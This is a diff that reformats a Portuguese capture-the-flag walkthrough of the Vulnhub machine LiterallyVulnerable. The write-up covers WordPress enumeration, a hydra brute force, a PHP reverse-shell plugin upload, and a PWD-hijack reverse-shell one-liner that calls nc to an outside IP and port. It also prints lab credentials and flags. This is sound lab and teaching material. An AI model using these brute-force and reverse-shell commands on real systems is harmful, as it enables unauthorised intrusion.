@@ -1,6 +1,7 @@
-Vulnhub - LiterallyVulnerable
-
-# Vulnhub - LiterallyVulnerable
+---
+title: LiterallyVulnerable
+category: Vulnhub
+---
 
 ## Enumeration
 
@@ -129,68 +130,93 @@ SCb$I^gDDqE34fA
 Ae%tM0XIWUMsCLp
 ```
 
-### Enum 80/TCP:
+### Enum 80/TCP
 
 Identificado Wordpress 5.3 em execução, sem plugins ou RCE vuln conhecidas.
-        - `wpscan --url http://literally.vulnerable -e vp,vt,u`
-            - Encontrado uma vulnerabilidade de listar posts protegidos por senha, porem nenhum post alem do default foi retornado
-            - Enumerado os users porém encontrado apenas o admin, para o qual as senhas existentes nenhuma teve êxito.
-            - Enumerado site com `dirbuster/directory-list-2.3-medium.txt` porem diversos erros 301 estavam sendo retornados. Ao alterar os parametros do dirbuster para excluir o redirect 301 como sucesso, apenas algumas paginas já conhecidas do Wordpress foram retornadas.
-            - Executado nikto e nenhum diretório interessante também foi retornado.
-                ○ Enum 65535/TCP
-                § Identificado pagina default do Apache2
-                § Executado gobuster com dirbuster/directory-list-2.3-medium.txt porem nenhum diretório relevante foi encontrado
-                § Executado dirbuster com a lista
-                § Uma vez que a enumeração com esta lista não houve sucesso e SSH e FTP não são vulneraveis, realizado enumeração novamente com outra lista de diretórios, dirb/big.txt, onde os diretórios abaixo foram retornados:
-                /.htpasswd (Status: 403)
-                /.htpasswd.php (Status: 403)
-                /.htaccess (Status: 403)
-                /.htaccess.php (Status: 403)
-                /javascript (Status: 301)
-                /phpcms (Status: 301)
-                /server-status (Status: 403)
-                § Ao acessar a pagina /phpcmd, observados dois pontos importantes sobre esta instalação do Wordpress:
-                □ Executado enumeração novamente com WPScan (wpscan --url http://literally.vulnerable:65535/phpcms -e vt,vp,u) e encontrado a mesma instalação do wordpress, porem com os users notadmin e maybeadmin
-                § Para as contas encontradas, realizado bruteforce utilizando hydra conforme linha de comando abaixo:
-                □ hydra -L users -P passwords literally.vulnerable -s 65535 -V http-form-post '/phpcms/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fliterally.vulnerable%3A65535%2Fphpcms%2Fwp-admin%2F&testcookie=1:incorrect'
-                □ Found password \[65535\]\[http-post-form\] host: literally.vulnerable login: maybeadmin password: 
-                
-                $EPid%J2L9LufO5 § Ao acessar com a conta "maybeadmin" foi possível ler o post protegido, uma vez que o usuário "maybeadmin" não possui grandes permissões. No post está contida a senha do user notadmin:Pa$
-                
-                $w0rd13!& § Com acesso total ao wordpress, tentado incluir um shell reverso/rce na maquina porem o editor não retorna sucesso ao salvar arquivos. A alternativa seria realizar o upload de um novo plugin ou tema para esta finalidade □ Criado um arquivo zip contendo dois arquivos: ® PluginManifest ® Shell (php reverseshell pentest monkey) □ Após upload, navegado no caminho wp-content/plugins/ABC123/XPTO.php (caminho fisico do arquivo no wordpress), onde foi possivel obter um shell. § Após se conectar na maquina, executado LinEnum encontrado um arquivo configurado com SUID § Ao executar este arquivo, o mesmo mostra o PWD. § Ao realizar o hijacking do PWD, executado o comando export para popular o atributo □ export PWD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.30.3.228 4443 >/tmp/f' § Neste novo shell, como John, foi possivel obter o arquivo user.txt john@literallyvulnerable:/home/john$
-                
-                KaTeX parse error: Expected 'EOF', got '&' at position 8: w0rd13!&̲ § Com acesso t…
-                
-                cat user.txt
-                Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;)
-                Flag: iuz1498ne667ldqmfarfrky9v5ylki
-                § Enumerando os arquivos em /home que o usuário tem acesso, encontrado um arquivo chamado myPassword:
-                john@literallyvulnerable:/home/john$ find /home -type f -readable 2> /dev/null
-                /home/doe/.bash_logout
-                /home/doe/.bashrc
-                /home/doe/noteFromAdmin
-                /home/doe/.profile
-                /home/doe/itseasy
-                /home/john/.bash_logout
-                /home/john/.ssh/authorized_keys
-                /home/john/user.txt
-                /home/john/.bashrc
-                /home/john/.local/share/tmpFiles/myPassword
-                /home/john/.profile
-                /home/john/.cache/motd.legal-displayed
-                § Conteúdo do arquivo myPassword
-                john@literallyvulnerable:/home/john$ cat /home/john/.local/share/tmpFiles/myPassword
-                I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
-                am9objpZWlckczhZNDlJQiNaWko=
-                § Decodificando a string, encontrado a senha
-                □ john:YZW$s8Y49IB#ZZJ
-                § Com o usuário e senha encontrados, foi possivel realizar o acesso via SSH com a conta john
-                § Com a senha, executado o comando sudo -l foi possivel enumerar os seguintes comandos que a conta pode executar como root:
-                □ /var/www/html/test.html
-                § Criado como www-data, um bash para gerar um shell reverso e obtido shell root.
-                § Output do arquivo /root/root.txt
+
+- `wpscan --url http://literally.vulnerable -e vp,vt,u`
+  - Encontrado uma vulnerabilidade de listar posts protegidos por senha, porem nenhum post alem do default foi retornado
+  - Enumerado os users porém encontrado apenas o admin, para o qual as senhas existentes nenhuma teve êxito.
+  - Enumerado site com `dirbuster/directory-list-2.3-medium.txt` porem diversos erros 301 estavam sendo retornados. Ao alterar os parametros do dirbuster para excluir o redirect 301 como sucesso, apenas algumas paginas já conhecidas do Wordpress foram retornadas.
+  - Executado nikto e nenhum diretório interessante também foi retornado.
+
+### Enum 65535/TCP
+
+- Identificado pagina default do Apache2
+- Executado gobuster com dirbuster/directory-list-2.3-medium.txt porem nenhum diretório relevante foi encontrado
+- Executado dirbuster com a lista
+- Uma vez que a enumeração com esta lista não houve sucesso e SSH e FTP não são vulneraveis, realizado enumeração novamente com outra lista de diretórios, dirb/big.txt, onde os diretórios abaixo foram retornados:
+
+```plaintext
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/javascript (Status: 301)
+/phpcms (Status: 301)
+/server-status (Status: 403)
+```
+
+- Ao acessar a pagina /phpcmd, observados dois pontos importantes sobre esta instalação do Wordpress:
+  - Executado enumeração novamente com WPScan (`wpscan --url http://literally.vulnerable:65535/phpcms -e vt,vp,u`) e encontrado a mesma instalação do wordpress, porem com os users `notadmin` e `maybeadmin`
+- Para as contas encontradas, realizado bruteforce utilizando hydra conforme linha de comando abaixo:
+
+```plaintext
+$ hydra -L users -P passwords literally.vulnerable -s 65535 -V http-form-post '/phpcms/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fliterally.vulnerable%3A65535%2Fphpcms%2Fwp-admin%2F&testcookie=1:incorrect'
+Found password \[65535\]\[http-post-form\] host: literally.vulnerable login: maybeadmin password:$EPid%J2L9LufO5 
+```
+
+- Ao acessar com a conta "maybeadmin" foi possível ler o post protegido, uma vez que o usuário "maybeadmin" não possui grandes permissões. No post está contida a senha do user `notadmin:Pa$$w0rd13!&`
+- Com acesso total ao wordpress, tentado incluir um shell reverso/rce na maquina porem o editor não retorna sucesso ao salvar arquivos. A alternativa seria realizar o upload de um novo plugin ou tema para esta finalidade
+  - Criado um arquivo zip contendo dois arquivos:
+    - PluginManifest
+    - Shell (php reverseshell pentest monkey)
+  - Após upload, navegado no caminho `wp-content/plugins/ABC123/XPTO.php` (caminho fisico do arquivo no wordpress), onde foi possivel obter um shell.
+- Após se conectar na maquina, executado LinEnum encontrado um arquivo configurado com SUID
+- Ao executar este arquivo, o mesmo mostra o PWD.
+- Ao realizar o hijacking do PWD, executado o comando export para popular o atributo
 
 ```bash
+export PWD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.30.3.228 4443 >/tmp/f'
+```
+
+- Neste novo shell, como John, foi possivel obter o arquivo user.txt
+
+```plaintext
+john@literallyvulnerable:/home/john$ cat user.txt
+Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;)
+Flag: iuz1498ne667ldqmfarfrky9v5ylki
+§ Enumerando os arquivos em /home que o usuário tem acesso, encontrado um arquivo chamado myPassword:
+john@literallyvulnerable:/home/john$ find /home -type f -readable 2> /dev/null
+/home/doe/.bash_logout
+/home/doe/.bashrc
+/home/doe/noteFromAdmin
+/home/doe/.profile
+/home/doe/itseasy
+/home/john/.bash_logout
+/home/john/.ssh/authorized_keys
+/home/john/user.txt
+/home/john/.bashrc
+/home/john/.local/share/tmpFiles/myPassword
+/home/john/.profile
+/home/john/.cache/motd.legal-displayed
+```
+
+- Conteúdo do arquivo myPassword
+
+```plaintext
+john@literallyvulnerable:/home/john$ cat /home/john/.local/share/tmpFiles/myPassword
+I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
+am9objpZWlckczhZNDlJQiNaWko=
+```
+
+- Decodificando a string, encontrado a senha **john:YZW$s8Y49IB#ZZJ**
+- Com o usuário e senha encontrados, foi possivel realizar o acesso via SSH com a conta john
+- Com a senha, executado o comando sudo -l foi possivel enumerar os seguintes comandos que a conta pode executar como root: `/var/www/html/test.html`
+- Criado como www-data, um bash para gerar um shell reverso e obtido shell root.
+- Output do arquivo /root/root.txt
+
+```plaintext
 cat root.txt 
 It was
  _     _ _                 _ _         _   _       _                      _     _      _ 
